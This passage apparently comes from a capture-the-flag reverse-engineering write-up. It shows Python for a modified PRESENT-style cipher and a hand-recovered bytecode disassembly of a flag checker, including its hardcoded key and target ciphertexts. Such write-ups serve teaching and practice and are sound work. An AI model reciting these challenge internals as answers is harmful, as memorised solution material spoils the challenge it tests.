class="keyword">def</span> <span class="title function_">pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state&gt;&gt;i)&amp;<span class="number">1</span>)&lt;&lt;PBox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate the roundkeys for a 80-bit key</span></span><br><span class="line"><span class="string">    Input:</span></span><br><span class="line"><span class="string">            key:    the key as a 80-bit integer</span></span><br><span class="line"><span class="string">            rounds: the number of rounds as an integer</span></span><br><span class="line"><span class="string">    Output: list of 64-bit roundkeys as integers&quot;&quot;&quot;</span></span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds + <span class="number">1</span>):  <span class="comment"># (K1 ... K32)</span></span><br><span class="line">        <span class="comment"># rawkey: used in comments to show what happens at bitlevel</span></span><br><span class="line">        <span class="comment"># rawKey[0:64]</span></span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 1. Shift</span></span><br><span class="line">        <span class="comment"># rawKey[19:len(rawKey)]+rawKey[0:19]</span></span><br><span class="line">        key = ((key &amp; (<span class="number">2</span> ** <span class="number">19</span> - <span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">        <span class="comment"># 2. SBox</span></span><br><span class="line">        <span class="comment"># rawKey[76:80] = S(rawKey[76:80])</span></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; (<span class="number">2</span> ** <span class="number">76</span> - <span class="number">1</span>))</span><br><span class="line">        <span class="comment">#3. Salt</span></span><br><span class="line">        <span class="comment">#rawKey[15:20] ^ i</span></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>)^(key&gt;&gt;<span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br></pre></td></tr></table></figure>

<p>æœ€åæ”¾ä¸€ä»½æ‰‹è„±marshalçš„å¤§è‡´å­—èŠ‚ç :</p>
<details>
<summary>ç‚¹å‡»æŸ¥çœ‹ä»£ç </summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 (43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">              2           0 LOAD_CONST               0 (&lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;addRoundKey&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (addRoundKey)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;sBoxLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (sBoxLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;pLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (pLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;string2number&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (string2number)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 (!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_GLOBAL              0 (sum)</span><br><span class="line">              2 LOAD_CLOSURE             0 (i)</span><br><span class="line">              4 BUILD_TUPLE              1</span><br><span class="line">              6 LOAD_CONST               1 (&lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;)</span><br><span class="line">              8 LOAD_CONST               2 (&#x27;string2number.&lt;locals&gt;.&lt;listcomp&gt;&#x27;)</span><br><span class="line">             10 MAKE_FUNCTION            8 (closure)</span><br><span class="line">             12 LOAD_GLOBAL              1 (range)</span><br><span class="line">             14 LOAD_CONST               3 (8)</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 GET_ITER</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                24 (to 30)</span><br><span class="line">              6 STORE_FAST               1 (c)</span><br><span class="line">              8 LOAD_GLOBAL              0 (ord)</span><br><span class="line">             10 LOAD_DEREF               0 (i)</span><br><span class="line">             12 LOAD_FAST                1 (c)</span><br><span class="line">             14 BINARY_SUBSCR</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 LOAD_CONST               0 (8)</span><br><span class="line">             20 LOAD_FAST                1 (c)</span><br><span class="line">             22 BINARY_MULTIPLY</span><br><span class="line">             24 BINARY_LSHIFT</span><br><span class="line">             26 LIST_APPEND              2</span><br><span class="line">             28 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   30 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (64)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                28 (to 42)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_FAST                0 (state)</span><br><span class="line">             20 LOAD_FAST                2 (i)</span><br><span class="line">             22 BINARY_RSHIFT</span><br><span class="line">             24 LOAD_CONST               3 (1)</span><br><span class="line">             26 BINARY_AND</span><br><span class="line">             28 LOAD_GLOBAL              1 (PBox)</span><br><span class="line">             30 LOAD_FAST                2 (i)</span><br><span class="line">             32 BINARY_SUBSCR</span><br><span class="line">             34 BINARY_LSHIFT</span><br><span class="line">             36 INPLACE_ADD</span><br><span class="line">             38 STORE_FAST               1 (output)</span><br><span class="line">             40 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   42 LOAD_FAST                1 (output)</span><br><span class="line">             44 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (16)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                36 (to 50)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_GLOBAL              1 (Sbox)</span><br><span class="line">             20 LOAD_FAST                0 (state)</span><br><span class="line">             22 LOAD_FAST                2 (i)</span><br><span class="line">             24 LOAD_CONST               3 (4)</span><br><span class="line">             26 BINARY_MULTIPLY</span><br><span class="line">             28 BINARY_RSHIFT</span><br><span class="line">             30 LOAD_CONST               4 (15)</span><br><span class="line">             32 BINARY_AND</span><br><span class="line">             34 BINARY_SUBSCR</span><br><span class="line">             36 LOAD_FAST                2 (i)</span><br><span class="line">             38 LOAD_CONST               3 (4)</span><br><span class="line">             40 BINARY_MULTIPLY</span><br><span class="line">             42 BINARY_LSHIFT</span><br><span class="line">             44 INPLACE_ADD</span><br><span class="line">             46 STORE_FAST               1 (output)</span><br><span class="line">             48 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   50 LOAD_FAST                1 (output)</span><br><span class="line">             52 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span 